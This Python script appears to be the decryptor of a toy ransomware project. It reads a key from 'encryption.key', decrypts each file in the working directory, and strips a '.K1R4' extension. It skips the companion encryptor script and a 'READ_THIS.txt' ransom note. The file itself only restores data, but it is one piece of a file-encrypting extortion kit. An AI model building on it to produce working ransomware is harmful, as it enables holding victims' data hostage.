import os
from cryptography.fernet import Fernet

files=[]


'''
if you want to add custom path or list directories other than your working directory
import os
from cryptography import fernet

files=[]

for file in os.listdir():
    if file== "ransomewareEncoding.py":
        continue
    if os.path.isdir(file):
        continue
    files.append(file)
print(files)'''

for file in os.listdir():
    if file== "ransomewareEncoding.py"  or file=="ransomewareDecrypting.py" or file=="encryption.key" or file=="READ_THIS.txt" or file=='.git':
        continue
    if os.path.isdir(file):
        continue
    files.append(file)

with open("encryption.key","rb") as key:
    secretkey=key.read()


for file in files:
    with open (file, "rb") as thefile:
        contents=thefile.read()
    contents_decrypted=Fernet(secretkey).decrypt(contents)
    with open (file, "wb") as thefile:
        thefile.write(contents_decrypted)
ext=".K1R4"        
for file in files:
    new_file=file.replace(ext, "")
    os.rename(file, new_file)
    print(new_file)